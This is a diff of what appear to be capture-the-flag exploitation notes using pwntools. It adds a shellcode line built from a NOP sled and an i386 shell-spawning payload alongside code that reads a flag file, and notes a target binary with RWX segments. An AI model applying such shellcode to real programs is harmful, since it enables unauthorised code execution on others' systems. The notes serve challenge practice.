@@ -22,6 +22,7 @@ r.interactive()
 
 # crafting shellcode assembly 
 assembly = shellcraft.i386.linux.readfile("./flag", 1) + shellcraft.i386.linux.exit()
+shellcode = pwnlib.shellcraft.i386.nop()*100 + pwnlib.shellcraft.i386.linux.sh()
 
 # converting asm to hex
 shellcode = asm(assembly, arch = 'i386', os = 'linux')
@@ -43,3 +44,5 @@ In [3]: e = ELF.from_bytes(open('./check4', 'rb').read())
     RWX:      Has RWX segments
 In [4]: e.save('stage4')
 
+# conversions
+u32(where_shellcode_is, sign="signed")
